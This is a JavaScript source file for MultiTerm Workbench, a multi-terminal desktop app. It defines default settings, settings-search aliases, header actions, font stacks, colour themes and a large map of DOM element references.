/*
 * MultiTerm Workbench
 * Copyright (C) 2026 the MultiTerm Workbench author (github.com/andrewtheart)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

const TITLE_FONT_SCALE_BOUNDS = { min: 80, max: 150, step: 5, fallback: 110 };
const WORKSPACE_ZOOM_BOUNDS = { min: 50, max: 150, step: 5, fallback: 100 };

const defaultSettings = {
  appTheme: "dark",
  automationHistoryLimit: 200,
  bellNotify: false,
  broadcastSendEnter: true,
  closeAction: "ask",
  columns: 2,
  compactChrome: false,
  copilotImportContextKb: 64,
  copyOnSelect: false,
  ctrlVPaste: true,
  cursorBlink: true,
  cursorStyle: "bar",
  focusWidth: 65,
  fontFamily: "Cascadia Mono",
  fontSize: 14,
  titleFontScale: TITLE_FONT_SCALE_BOUNDS.fallback,
  gap: 10,
  headerHidden: false,
  headerActionDragScope: "ask",
  headerActionsInMenu: ["find", "duplicate"],
  highlightInputPrompts: true,
  keepSessionsOnClose: true,
  layout: "auto",
  minimizedScope: "page",
  minWidth: 420,
  maxInstallerSizeMb: 256,
  notifyActivity: false,
  notifySilence: false,
  outputBacklogKb: 1024,
  outputCoalesceMs: 8,
  pageCloseAction: "ask",
  paneHeight: 320,
  pagerCollapsed: false,
  pagerPlacement: "bottom",
  cleanCopilotClipboard: true,
  restoreSession: false,
  rightClickAction: "menu",
  rightClickAck: "",
  rows: 2,
  scrollOnOutput: false,
  scrollback: 20000,
  scrollbackInfinite: false,
  sidecarHidden: false,
  silenceSeconds: 10,
  snippets: [
    { name: "Clear screen", command: "Clear-Host" },
    { name: "Git status", command: "git status" },
    { name: "Top processes", command: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 15" }
  ],
  startupCommand: "",
  syncInput: false,
  terminalInboxCapacity: 500,
  terminalMessageMaxKb: 64,
  theme: "ember",
  workspaceZoom: WORKSPACE_ZOOM_BOUNDS.fallback
};

const PANE_COLORS = ["#4fd1b0", "#7ca8f6", "#f0b35a", "#e8695b", "#d486e8", "#94d36f"];
const TERMINAL_NOTIFICATION_SETTINGS = Object.freeze({
  activity: "notifyActivity",
  idle: "notifySilence",
  bell: "bellNotify"
});

const SETTINGS_SEARCH_ALIASES = Object.freeze({
  analyticsReset: "analytics statistics metrics usage productivity keyboard keystrokes keys typing focus focused time duration reset clear",
  appTheme: "appearance color colours scheme mode dark light system ui interface look visual",
  fontFamily: "typeface typography text lettering monospace console font face cascadia consolas jetbrains fira courier",
  titleFontScale: "terminal pane title header label text font size scale percentage larger smaller",
  cursorStyle: "caret insertion point beam bar block underline pointer shape",
  cursorBlink: "caret flashing flash pulse animation animate",
  layoutMode: "arrangement arrange tiling tile panes splits split grid mosaic stack strip rail master carousel spotlight bento canvas automatic",
  pagerPlacement: "pages page tabs tab tabbar tab-bar navigation navigator pagebar page-bar pager position placement location dock docking top bottom left right side sidebar",
  workspaceZoom: "workspace canvas stage zoom scale magnify shrink density overview wheel scroll pinch trackpad terminals panes tiles more fewer",
  minWidth: "minimum pane terminal tile width size horizontal narrow responsive compact",
  columnCount: "number columns grid across horizontal panes tiles count",
  rowCount: "number rows grid down vertical panes tiles count",
  paneHeight: "terminal pane tile height vertical size dimension",
  focusWidth: "primary main master focus featured pane width ratio percentage",
  paneGap: "spacing space gutter margin padding between panes tiles separation",
  fontSize: "text size type scale zoom terminal typography larger smaller",
  terminalTheme: "terminal console colors colours color scheme palette background foreground contrast appearance",
  compactChrome: "dense compact chrome ui toolbar header controls small spacing slim",
  copilotImportContextKb: "copilot session import context transcript history vscode visual studio cli size kilobytes kb continuation",
  syncInput: "broadcast keyboard keys keystrokes mirror mirrored linked simultaneous type typing all terminals panes",
  ctrlVPaste: "clipboard paste keyboard shortcut control ctrl v insert",
  cleanCopilotClipboard: "copilot clipboard copy borders pipes ascii formatting cleanup clean markdown table",
  rightClickAction: "right click right-click mouse secondary context menu paste run execute",
  headerActionDragScope: "header toolbar buttons actions drag drop customize overflow hamburger menu scope all every terminal pane remember ask",
  scrollbackLines: "terminal history output buffer retention lines backscroll transcript",
  scrollbackInfinite: "unlimited infinite terminal history output buffer no limit scrollback",
  scrollOnOutput: "follow tail auto scroll autoscroll bottom new output terminal",
  outputCoalesceMs: "performance output batching batch coalesce grouping bridge chunks messages latency throttle delay milliseconds pty",
  outputBacklogKb: "performance output buffer queue backlog burst memory ram renderer pending kilobytes kb",
  maxInstallerSizeMb: "updater update download installer package maximum max size limit ceiling security megabytes mb",
  pageCloseAction: "page pages close remove terminals sessions move relocate ask remember confirmation prompt",
  keepSessionsOnClose: "keep preserve survive terminals sessions shells processes bridge background detach close quit exit window alive",
  restoreSession: "restore reopen remember previous last session startup launch restart terminals workspace resume",
  autoUpdateChecks: "automatic updates updater check releases versions upgrade background scheduled",
  updateCheckIntervalHours: "update frequency cadence schedule interval timer hours polling check updater",
  bellNotify: "bell beep ding sound terminal notification notifications alert alerts audible",
  copyOnSelect: "selection selected highlight mouse clipboard copy automatically auto",
  highlightInputPrompts: "awaiting input prompt prompts question questions badge glow attention detect detection interactive highlight",
  notifyActivity: "activity busy background output notification notifications alert alerts terminal change",
  notifySilence: "idle quiet silence inactivity completion done notification notifications alert alerts terminal",
  silenceSeconds: "idle quiet silence inactivity timeout delay seconds threshold completion",
  startupCommand: "startup cmd command run execute launch new terminal initialization init shell profile",
  terminalMessageMaxKb: "communication message messages handoff transfer payload maximum max size limit kb kilobytes terminal",
  terminalInboxCapacity: "communication inbox queue pending handoff handoffs messages capacity quota limit per terminal retained",
  snippetList: "snippets snippet macros macro templates template favorites favourite commands quick actions automation saved commands",
  snippetName: "snippet macro template favorite favourite label title name",
  snippetCommand: "snippet macro template command script run execute automation",
  snippetAdd: "snippet macro template add create new save command",
  fitAll: "fit resize refit arrange terminals panes layout maximize fill screen",
  resetLayout: "reset restore defaults default layout arrangement positions clear undo",
  workspaceSelect: "workspace workspaces project projects profile profiles layout layouts preset presets snapshot snapshots saved session sessions",
  workspaceName: "workspace project profile layout preset snapshot name create new",
  workspaceSave: "workspace project profile layout preset snapshot save store remember capture",
  workspaceRestore: "workspace project profile layout preset snapshot restore load open apply",
  workspaceDelete: "workspace project profile layout preset snapshot delete remove forget"
});

// Pane width (px) below which the secondary header actions (move left/right,
// cycle label color, duplicate) collapse into the per-pane overflow menu. Below
// roughly this width the full button row starts squeezing the title field, so
// the actions move into the menu rather than crowding or hiding the title.
const PANE_OVERFLOW_WIDTH = 600;
const HEADER_ACTION_IDS = [
  "move-left", "move-right", "find", "clear", "copy", "color", "restart",
  "dequeue", "artifacts", "minimize", "focus", "maximize", "duplicate", "close"
];
const HEADER_ACTION_ID_SET = new Set(HEADER_ACTION_IDS);
const DEFAULT_HEADER_ACTIONS_IN_MENU = ["find", "duplicate"];
const HEADER_ACTIONS = Object.freeze({
  "move-left": { label: "Move left", icon: "arrow-left" },
  "move-right": { label: "Move right", icon: "arrow-right" },
  find: { label: "Find\u2026", icon: "search", hint: "Ctrl+F" },
  clear: { label: "Clear", icon: "eraser" },
  copy: { label: "Copy output", icon: "copy" },
  color: { label: "Cycle label color", icon: "tag" },
  restart: { label: "Restart", icon: "rotate-cw", hint: "Ctrl+Shift+R" },
  dequeue: { label: "Run next queued command", icon: "list-start" },
  artifacts: { label: "Notes & command queue", icon: "notebook-tabs" },
  minimize: { label: "Minimize", icon: "minus" },
  focus: { label: "Focus", icon: "panel-left-close" },
  maximize: { label: "Maximize", icon: "maximize-2" },
  duplicate: { label: "Duplicate", icon: "copy-plus" },
  close: { label: "Close", icon: "x", hint: "Ctrl+Shift+W", danger: true }
});

// Bumped on each rebuild. See /memories/repo for the convention.
const APP_VERSION = "0.1.66";
const AUTOMATIONS_STORAGE_KEY = "multiterm.automations";
const TERMINAL_ARTIFACTS_STORAGE_KEY = "multiterm.terminalArtifacts";
const TERMINAL_ANALYTICS_STORAGE_KEY = "multiterm.analytics";
const MIN_FONT_SIZE = 10;
const MAX_FONT_SIZE = 22;
const COPILOT_YOLO_COMMAND = "copilot --yolo";
const COPILOT_RESUME_ID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
const terminalMessaging = window.TerminalMessaging;
const automationApi = window.MultiTermAutomations;

// xterm reports focus changes back to the shell as data when the application
// enables DECSET 1004 (which ConPTY does): ESC [ I on focus in, ESC [ O on
// focus out. That is protocol chatter, not the user answering a prompt, so it
// must still be forwarded but must not count as input.
const FOCUS_REPORT_SEQUENCE = /^\u001b\[[IO]$/;

const fontStacks = {
  "Cascadia Mono": "'Cascadia Mono', Consolas, 'Courier New', monospace",
  "Cascadia Code": "'Cascadia Code', 'Cascadia Mono', Consolas, monospace",
  "Consolas": "Consolas, 'Cascadia Mono', 'Courier New', monospace",
  "JetBrains Mono": "'JetBrains Mono', 'Cascadia Mono', Consolas, monospace",
  "Fira Code": "'Fira Code', 'Cascadia Mono', Consolas, monospace",
  "Courier New": "'Courier New', Consolas, monospace"
};

const themes = {
  ember: {
    background: "#0d0e0c",
    black: "#12130f",
    blue: "#6ca8f6",
    brightBlack: "#5a5f55",
    brightBlue: "#9fc4ff",
    brightCyan: "#a6f0df",
    brightGreen: "#b8e986",
    brightMagenta: "#e7a4f7",
    brightRed: "#ff8f82",
    brightWhite: "#fff7e5",
    brightYellow: "#ffd27a",
    cursor: "#79d7bd",
    cyan: "#79d7bd",
    foreground: "#eee9db",
    green: "#94d36f",
    magenta: "#d486e8",
    red: "#e36b5d",
    selectionBackground: "#36554b",
    white: "#eee9db",
    yellow: "#f0b35a"
  },
  graphite: {
    background: "#101112",
    black: "#101112",
    blue: "#7aa2f7",
    brightBlack: "#5c6370",
    brightBlue: "#9dbdff",
    brightCyan: "#8bd5ca",
    brightGreen: "#b7d97a",
    brightMagenta: "#d7a6ff",
    brightRed: "#ff8b8b",
    brightWhite: "#f4f2eb",
    brightYellow: "#ffd580",
    cursor: "#f0b35a",
    cyan: "#72c7bd",
    foreground: "#e6e1d4",
    green: "#9ece6a",
    magenta: "#bb9af7",
    red: "#f7768e",
    selectionBackground: "#40434a",
    white: "#d8d4c8",
    yellow: "#e0af68"
  },
  paper: {
    background: "#fbf7ec",
    black: "#24231f",
    blue: "#2862b9",
    brightBlack: "#777266",
    brightBlue: "#447bd4",
    brightCyan: "#158a7c",
    brightGreen: "#487a24",
    brightMagenta: "#8a4ab8",
    brightRed: "#c5443e",
    brightWhite: "#ffffff",
    brightYellow: "#9c6b0d",
    cursor: "#222222",
    cyan: "#087b70",
    foreground: "#24231f",
    green: "#3d741f",
    magenta: "#7a3fb0",
    red: "#b43631",
    selectionBackground: "#d6eadf",
    white: "#ede6d7",
    yellow: "#8b620d"
  },
  contrast: {
    background: "#000000",
    black: "#000000",
    blue: "#5da7ff",
    brightBlack: "#777777",
    brightBlue: "#9dccff",
    brightCyan: "#9effff",
    brightGreen: "#b8ff70",
    brightMagenta: "#ff9cff",
    brightRed: "#ff8d8d",
    brightWhite: "#ffffff",
    brightYellow: "#ffff87",
    cursor: "#ffffff",
    cyan: "#6ef7f2",
    foreground: "#ffffff",
    green: "#9cff57",
    magenta: "#ff7dff",
    red: "#ff5f5f",
    selectionBackground: "#555555",
    white: "#eeeeee",
    yellow: "#ffd75f"
  }
};

const elements = {
  addTerminal: document.querySelector("#addTerminal"),
  appShell: document.querySelector(".app-shell"),
  chromeControls: document.querySelector(".chrome-controls"),
  attachTmux: document.querySelector("#attachTmux"),
  analyticsEmpty: document.querySelector("#analyticsEmpty"),
  analyticsReset: document.querySelector("#analyticsReset"),
  analyticsTerminalList: document.querySelector("#analyticsTerminalList"),
  analyticsTodayFocus: document.querySelector("#analyticsTodayFocus"),
  analyticsTodayKeystrokes: document.querySelector("#analyticsTodayKeystrokes"),
  analyticsTotalFocus: document.querySelector("#analyticsTotalFocus"),
  analyticsTotalKeystrokes: document.querySelector("#analyticsTotalKeystrokes"),
  appTheme: document.querySelector("#appTheme"),
  aboutClose: document.querySelector("#aboutClose"),
  aboutCheckUpdates: document.querySelector("#aboutCheckUpdates"),
  aboutOverlay: document.querySelector("#aboutOverlay"),
  aboutToggle: document.querySelector("#aboutToggle"),
  aboutVersion: document.querySelector("#aboutVersion"),
  aboutVersionText: document.querySelector("#aboutVersionText"),
  autoUpdateChecks: document.querySelector("#autoUpdateChecks"),
  automationActionAdd: document.querySelector("#automationActionAdd"),
  automationActionList: document.querySelector("#automationActionList"),
  automationActivityClear: document.querySelector("#automationActivityClear"),
  automationActivityEmpty: document.querySelector("#automationActivityEmpty"),
  automationActivityFilter: document.querySelector("#automationActivityFilter"),
  automationActivityList: document.querySelector("#automationActivityList"),
  automationBadge: document.querySelector("#automationsBadge"),
  automationCancel: document.querySelector("#automationCancel"),
  automationCatchUp: document.querySelector("#automationCatchUp"),
  automationClockFields: document.querySelector("#automationClockFields"),
  automationClose: document.querySelector("#automationsClose"),
  automationDays: document.querySelector("#automationDays"),
  automationDelete: document.querySelector("#automationDelete"),
  automationEditor: document.querySelector("#automationEditor"),
  automationEditorTitle: document.querySelector("#automationEditorTitle"),
  automationHistoryLimit: document.querySelector("#automationHistoryLimit"),
  automationInterval: document.querySelector("#automationInterval"),
  automationIntervalFields: document.querySelector("#automationIntervalFields"),
  automationIntervalUnit: document.querySelector("#automationIntervalUnit"),
  automationName: document.querySelector("#automationName"),
  automationNew: document.querySelector("#automationNew"),
  automationOverlay: document.querySelector("#automationsOverlay"),
  automationPause: document.querySelector("#automationsPause"),
  automationPreview: document.querySelector("#automationPreview"),
  automationRouteEmpty: document.querySelector("#automationRouteEmpty"),
  automationRouteList: document.querySelector("#automationRouteList"),
  automationRuleEmpty: document.querySelector("#automationRuleEmpty"),
  automationRuleList: document.querySelector("#automationRuleList"),
  automationRunNow: document.querySelector("#automationRunNow"),
  automationSave: document.querySelector("#automationSave"),
  automationSearch: document.querySelector("#automationSearch"),
  automationTime: document.querySelector("#automationTime"),
  automationToggle: document.querySelector("#automationsToggle"),
  automationWelcome: document.querySelector("#automationWelcome"),
  automationWelcomeNew: document.querySelector("#automationWelcomeNew"),
  bellNotify: document.querySelector("#bellNotify"),
  bridgeStatus: document.querySelector("#bridgeStatus"),
  findAllBar: document.querySelector("#findAllBar"),
  findAllInput: document.querySelector("#findAllInput"),
  findAllCount: document.querySelector("#findAllCount"),
  broadcastBar: document.querySelector("#broadcastBar"),
  broadcastClose: document.querySelector("#broadcastClose"),
  broadcastEnter: document.querySelector("#broadcastEnter"),
  broadcastInput: document.querySelector("#broadcastInput"),
  broadcastScope: document.querySelector("#broadcastScope"),
  broadcastSend: document.querySelector("#broadcastSend"),
  broadcastToggle: document.querySelector("#broadcastToggle"),
  closeAllTerminals: document.querySelector("#closeAllTerminals"),
  columnCount: document.querySelector("#columnCount"),
  columnCountValue: document.querySelector("#columnCountValue"),
  commandPalette: document.querySelector("#commandPalette"),
  commandQueueAdd: document.querySelector("#commandQueueAdd"),
  commandQueueEmpty: document.querySelector("#commandQueueEmpty"),
  commandQueueHint: document.querySelector("#commandQueueHint"),
  commandQueueInput: document.querySelector("#commandQueueInput"),
  commandQueueList: document.querySelector("#commandQueueList"),
  compactChrome: document.querySelector("#compactChrome"),
  copilotImportContextKb: document.querySelector("#copilotImportContextKb"),
  copilotResumeClose: document.querySelector("#copilotResumeClose"),
  copilotResumeDescription: document.querySelector("#copilotResumeDescription"),
  copilotResumeList: document.querySelector("#copilotResumeList"),
  copilotResumeOverlay: document.querySelector("#copilotResumeOverlay"),
  copilotResumeRefresh: document.querySelector("#copilotResumeRefresh"),
  copilotResumeSearch: document.querySelector("#copilotResumeSearch"),
  copilotResumeStatus: document.querySelector("#copilotResumeStatus"),
  copilotSessionsToggle: document.querySelector("#copilotSessionsToggle"),
  contextMenu: document.querySelector("#contextMenu"),
  contextSubmenu: document.querySelector("#contextSubmenu"),
  controlPanel: document.querySelector(".control-panel"),
  cleanCopilotClipboard: document.querySelector("#cleanCopilotClipboard"),
  copyOnSelect: document.querySelector("#copyOnSelect"),
  ctrlVPaste: document.querySelector("#ctrlVPaste"),
  cursorBlink: document.querySelector("#cursorBlink"),
  cursorStyle: document.querySelector("#cursorStyle"),
  cwdInput: document.querySelector("#cwdInput"),
  fitAll: document.querySelector("#fitAll"),
  focusWidth: document.querySelector("#focusWidth"),
  focusWidthValue: document.querySelector("#focusWidthValue"),
  fullscreenAddTerminal: document.querySelector("#fullscreenAddTerminal"),
  fontFamily: document.querySelector("#fontFamily"),
  fontSize: document.querySelector("#fontSize"),
  fontSizeValue: document.querySelector("#fontSizeValue"),
  titleFontScale: document.querySelector("#titleFontScale"),
  titleFontScaleValue: document.querySelector("#titleFontScaleValue"),
  headerActionScopeApply: document.querySelector("#headerActionScopeApply"),
  headerActionScopeCancel: document.querySelector("#headerActionScopeCancel"),
  headerActionScopeFlyout: document.querySelector("#headerActionScopeFlyout"),
  headerActionScopeRemember: document.querySelector("#headerActionScopeRemember"),
  headerActionScopeText: document.querySelector("#headerActionScopeText"),
  headerActionScopeTitle: document.querySelector("#headerActionScopeTitle"),
  headerActionDragScope: document.querySelector("#headerActionDragScope"),
  helpToggle: document.querySelector("#helpToggle"),
  helpDocToggle: document.querySelector("#helpDocToggle"),
  helpDocClose: document.querySelector("#helpDocClose"),
  helpOverlay: document.querySelector("#helpOverlay"),
  helpFrame: document.querySelector("#helpFrame"),
  highlightInputPrompts: document.querySelector("#highlightInputPrompts"),
  host: document.querySelector("#terminalHost"),
  keepSessionsOnClose: document.querySelector("#keepSessionsOnClose"),
  layoutMode: document.querySelector("#layoutMode"),
  logClear: document.querySelector("#logClear"),
  logClose: document.querySelector("#logClose"),
  logCopy: document.querySelector("#logCopy"),
  logLevelFilter: document.querySelector("#logLevelFilter"),
  logOutput: document.querySelector("#logOutput"),
  logPanel: document.querySelector("#logPanel"),
  logToggle: document.querySelector("#logToggle"),
  logToggleDot: document.querySelector("#logToggleDot"),
  minWidth: document.querySelector("#minWidth"),
  minWidthValue: document.querySelector("#minWidthValue"),
  minimizedDock: document.querySelector("#minimizedDock"),
  messageComposerError: document.querySelector("#messageComposerError"),
  messageConnectionsEmpty: document.querySelector("#messageConnectionsEmpty"),
  messageConnectionsList: document.querySelector("#messageConnectionsList"),
  messageConnectionsMap: document.querySelector("#messageConnectionsMap"),
  terminalConnectorAction: document.querySelector("#terminalConnectorAction"),
  terminalConnectorLabel: document.querySelector("#terminalConnectorLabel"),
  terminalConnectorSend: document.querySelector("#terminalConnectorSend"),
  messageKind: document.querySelector("#messageKind"),
  messageLinkAdd: document.querySelector("#messageLinkAdd"),
  messagePath: document.querySelector("#messagePath"),
  messagePathRow: document.querySelector("#messagePathRow"),
  messageSend: document.querySelector("#messageSend"),
  messageSource: document.querySelector("#messageSource"),
  messageStatus: document.querySelector("#messageStatus"),
  messageStatusRow: document.querySelector("#messageStatusRow"),
  messageTarget: document.querySelector("#messageTarget"),
  messageText: document.querySelector("#messageText"),
  messageTextRow: document.querySelector("#messageTextRow"),
  maxInstallerSizeMb: document.querySelector("#maxInstallerSizeMb"),
  notifyActivity: document.querySelector("#notifyActivity"),
  notifySilence: document.querySelector("#notifySilence"),
  outputBacklogKb: document.querySelector("#outputBacklogKb"),
  outputCoalesceMs: document.querySelector("#outputCoalesceMs"),
  pagerPlacement: document.querySelector("#pagerPlacement"),
  paletteInput: document.querySelector("#paletteInput"),
  paletteList: document.querySelector("#paletteList"),
  paletteOverlay: document.querySelector("#paletteOverlay"),
  pager: document.querySelector("#pager"),
  pagerAdd: document.querySelector("#pagerAdd"),
  pagerCollapse: document.querySelector("#pagerCollapse"),
  pagerList: document.querySelector("#pagerList"),
  quickSwitchInput: document.querySelector("#quickSwitchInput"),
  quickSwitchList: document.querySelector("#quickSwitchList"),
  quickSwitchOverlay: document.querySelector("#quickSwitchOverlay"),
  prepareCleanCopilot: document.querySelector("#prepareCleanCopilot"),
  prepareClose: document.querySelector("#prepareClose"),
  prepareCopy: document.querySelector("#prepareCopy"),
  prepareEditSurface: document.querySelector("#prepareEditSurface"),
  prepareFileName: document.querySelector("#prepareFileName"),
  prepareFind: document.querySelector("#prepareFind"),
  prepareFindBar: document.querySelector("#prepareFindBar"),
  prepareFindNext: document.querySelector("#prepareFindNext"),
  prepareFindPrevious: document.querySelector("#prepareFindPrevious"),
  prepareFindToggle: document.querySelector("#prepareFindToggle"),
  prepareIssues: document.querySelector("#prepareIssues"),
  prepareLanguage: document.querySelector("#prepareLanguage"),
  prepareLineMeasure: document.querySelector("#prepareLineMeasure"),
  prepareLineNumbers: document.querySelector("#prepareLineNumbers"),
  prepareOverlay: document.querySelector("#prepareOverlay"),
  prepareRedo: document.querySelector("#prepareRedo"),
  prepareReplace: document.querySelector("#prepareReplace"),
  prepareReplaceAll: document.querySelector("#prepareReplaceAll"),
  prepareReplaceOne: document.querySelector("#prepareReplaceOne"),
  prepareSaveFile: document.querySelector("#prepareSaveFile"),
  prepareSaveSnippet: document.querySelector("#prepareSaveSnippet"),
  prepareSend: document.querySelector("#prepareSend"),
  prepareSnippetName: document.querySelector("#prepareSnippetName"),
  prepareSource: document.querySelector("#prepareSource"),
  prepareStatus: document.querySelector("#prepareStatus"),
  prepareTitle: document.querySelector("#prepareTitle"),
  prepareTerminalFlyout: document.querySelector("#prepareTerminalFlyout"),
  prepareTerminalList: document.querySelector("#prepareTerminalList"),
  prepareText: document.querySelector("#prepareText"),
  prepareUndo: document.querySelector("#prepareUndo"),
  prepareValidate: document.querySelector("#prepareValidate"),
  prepareValidation: document.querySelector("#prepareValidation"),
  prepareWrap: document.querySelector("#prepareWrap"),
  tmuxAttachClose: document.querySelector("#tmuxAttachClose"),
  tmuxAttachList: document.querySelector("#tmuxAttachList"),
  tmuxAttachOverlay: document.querySelector("#tmuxAttachOverlay"),
  tmuxAttachRefresh: document.querySelector("#tmuxAttachRefresh"),
  tmuxAttachStatus: document.querySelector("#tmuxAttachStatus"),
  closeConfirmOverlay: document.querySelector("#closeConfirmOverlay"),
  closeConfirmTitle: document.querySelector("#closeConfirmTitle"),
  closeConfirmText: document.querySelector("#closeConfirmText"),
  closeConfirmRemember: document.querySelector("#closeConfirmRemember"),
  closeConfirmRememberRow: document.querySelector("#closeConfirmRememberRow"),
  closeConfirmTray: document.querySelector("#closeConfirmTray"),
  closeConfirmKeep: document.querySelector("#closeConfirmKeep"),
  closeConfirmQuit: document.querySelector("#closeConfirmQuit"),
  pageCloseAction: document.querySelector("#pageCloseAction"),
  pageCloseOverlay: document.querySelector("#pageCloseOverlay"),
  pageCloseTitle: document.querySelector("#pageCloseTitle"),
  pageCloseText: document.querySelector("#pageCloseText"),
  pageCloseRemember: document.querySelector("#pageCloseRemember"),
  pageCloseMove: document.querySelector("#pageCloseMove"),
  pageCloseTerminals: document.querySelector("#pageCloseTerminals"),
  pageCloseCancel: document.querySelector("#pageCloseCancel"),
  paneGap: document.querySelector("#paneGap"),
  paneGapValue: document.querySelector("#paneGapValue"),
  paneHeight: document.querySelector("#paneHeight"),
  paneHeightValue: document.querySelector("#paneHeightValue"),
  paneTemplate: document.querySelector("#paneTemplate"),
  resetLayout: document.querySelector("#resetLayout"),
  restoreSession: document.querySelector("#restoreSession"),
  rightClickAction: document.querySelector("#rightClickAction"),
  rightClickWarnOverlay: document.querySelector("#rightClickWarnOverlay"),
  rightClickWarnText: document.querySelector("#rightClickWarnText"),
  rightClickWarnRemember: document.querySelector("#rightClickWarnRemember"),
  rightClickWarnCancel: document.querySelector("#rightClickWarnCancel"),
  rightClickWarnProceed: document.querySelector("#rightClickWarnProceed"),
  rowCount: document.querySelector("#rowCount"),
  rowCountValue: document.querySelector("#rowCountValue"),
  scrollOnOutput: document.querySelector("#scrollOnOutput"),
  scrollbackInfinite: document.querySelector("#scrollbackInfinite"),
  scrollbackLines: document.querySelector("#scrollbackLines"),
  settingsSearch: document.querySelector("#settingsSearch"),
  settingsShowAll: document.querySelector("#settingsShowAll"),
  silenceSeconds: document.querySelector("#silenceSeconds"),
  snippetAdd: document.querySelector("#snippetAdd"),
  snippetCommand: document.querySelector("#snippetCommand"),
  snippetList: document.querySelector("#snippetList"),
  snippetName: document.querySelector("#snippetName"),
  shellSelect: document.querySelector("#shellSelect"),
  snapPreview: document.querySelector("#snapPreview"),
  stage: document.querySelector(".stage"),
  shortcutsClose: document.querySelector("#shortcutsClose"),
  shortcutsCatalog: document.querySelector("#shortcutsCatalog"),
  shortcutsOverlay: document.querySelector("#shortcutsOverlay"),
  startupCommand: document.querySelector("#startupCommand"),
  statusConn: document.querySelector("#statusConn"),
  statusAdmin: document.querySelector("#statusAdmin"),
  statusMem: document.querySelector("#statusMem"),
  statusMemText: document.querySelector("#statusMemText"),
  statusSessions: document.querySelector("#statusSessions"),
  statusShellText: document.querySelector("#statusShellText"),
  statusZoomIn: document.querySelector("#statusZoomIn"),
  statusZoomOut: document.querySelector("#statusZoomOut"),
  statusWorkspaceZoom: document.querySelector("#statusWorkspaceZoom"),
  statusWorkspaceZoomValue: document.querySelector("#statusWorkspaceZoomValue"),
  statisticsBody: document.querySelector("#statisticsBody"),
  statisticsClose: document.querySelector("#statisticsClose"),
  statisticsOverlay: document.querySelector("#statisticsOverlay"),
  statisticsRefresh: document.querySelector("#statisticsRefresh"),
  statisticsSubtitle: document.querySelector("#statisticsSubtitle"),
  statisticsTitle: document.querySelector("#statisticsTitle"),
  updateClose: document.querySelector("#updateClose"),
  updateConsentDecline: document.querySelector("#updateConsentDecline"),
  updateConsentEnable: document.querySelector("#updateConsentEnable"),
  updateConsentInterval: document.querySelector("#updateConsentInterval"),
  updateConsentOverlay: document.querySelector("#updateConsentOverlay"),
  updateError: document.querySelector("#updateError"),
  updateCheckIntervalHours: document.querySelector("#updateCheckIntervalHours"),
  updateInstall: document.querySelector("#updateInstall"),
  updateLater: document.querySelector("#updateLater"),
  updateNotes: document.querySelector("#updateNotes"),
  updateOverlay: document.querySelector("#updateOverlay"),
  updateProgress: document.querySelector("#updateProgress"),
  updateProgressBar: document.querySelector("#updateProgressBar"),
  updateProgressText: document.querySelector("#updateProgressText"),
  updateSubtitle: document.querySelector("#updateSubtitle"),
  updateTitle: document.querySelector("#updateTitle"),
  updateViewRelease: document.querySelector("#updateViewRelease"),
  syncInput: document.querySelector("#syncInput"),
  terminalSearchInput: document.querySelector("#terminalSearchInput"),
  terminalSearchCount: document.querySelector("#terminalSearchCount"),
  terminalArtifactsBadge: document.querySelector("#terminalArtifactsBadge"),
  terminalArtifactsClose: document.querySelector("#terminalArtifactsClose"),
  terminalArtifactsOverlay: document.querySelector("#terminalArtifactsOverlay"),
  terminalArtifactsSubtitle: document.querySelector("#terminalArtifactsSubtitle"),
  terminalArtifactsTarget: document.querySelector("#terminalArtifactsTarget"),
  terminalArtifactsToggle: document.querySelector("#terminalArtifactsToggle"),
  terminalInboxCapacity: document.querySelector("#terminalInboxCapacity"),
  terminalMessageMaxKb: document.querySelector("#terminalMessageMaxKb"),
  terminalNotificationFlyout: document.querySelector("#terminalNotificationFlyout"),
  terminalNotificationGlobalSummary: document.querySelector("#terminalNotificationGlobalSummary"),
  terminalNotificationReset: document.querySelector("#terminalNotificationReset"),
  terminalNotificationSubtitle: document.querySelector("#terminalNotificationSubtitle"),
  terminalMessagesBadge: document.querySelector("#terminalMessagesBadge"),
  terminalMessagesClose: document.querySelector("#terminalMessagesClose"),
  terminalMessagesEmpty: document.querySelector("#terminalMessagesEmpty"),
  terminalMessagesList: document.querySelector("#terminalMessagesList"),
  terminalMessagesOverlay: document.querySelector("#terminalMessagesOverlay"),
  terminalMessagesRefresh: document.querySelector("#terminalMessagesRefresh"),
  terminalMessagesToggle: document.querySelector("#terminalMessagesToggle"),
  terminalConnectionPaths: document.querySelector("#terminalConnectionPaths"),
  terminalConnectionsOverlay: document.querySelector("#terminalConnectionsOverlay"),
  terminalNotesIdentity: document.querySelector("#terminalNotesIdentity"),
  terminalNotesInput: document.querySelector("#terminalNotesInput"),
  terminalNotesSaved: document.querySelector("#terminalNotesSaved"),
  terminalNotesSection: document.querySelector("#terminalNotesSection"),
  terminalTheme: document.querySelector("#terminalTheme"),
  themeToggle: document.querySelector("#themeToggle"),
  toastHost: document.querySelector("#toastHost"),
  toggleHeader: document.querySelector("#toggleHeader"),
  toggleHeaderTop: document.querySelector("#toggleHeaderTop"),
  togglePager: document.querySelector("#togglePager"),
  toggleSidecar: document.querySelector("#toggleSidecar"),
  toggleSidecarTop: document.querySelector("#toggleSidecarTop"),
  recoveredNotesEmpty: document.querySelector("#recoveredNotesEmpty"),
  recoveredNotesList: document.querySelector("#recoveredNotesList"),
  unparentedQueueTarget: document.querySelector("#unparentedQueueTarget"),
  unparentedTargetRow: document.querySelector("#unparentedTargetRow"),
  workspaceDelete: document.querySelector("#workspaceDelete"),
  workspaceName: document.querySelector("#workspaceName"),
  workspaceRestore: document.querySelector("#workspaceRestore"),
  workspaceSave: document.querySelector("#workspaceSave"),
  workspaceSelect: document.querySelector("#workspaceSelect"),
  workspaceZoom: document.querySelector("#workspaceZoom"),
  workspaceZoomIndicator: document.querySelector("#workspaceZoomIndicator"),
  workspaceZoomValue: document.querySelector("#workspaceZoomValue"),
  workbench: document.querySelector(".workbench")
};

const systemThemeQuery = window.matchMedia("(prefers-color-scheme: dark)");
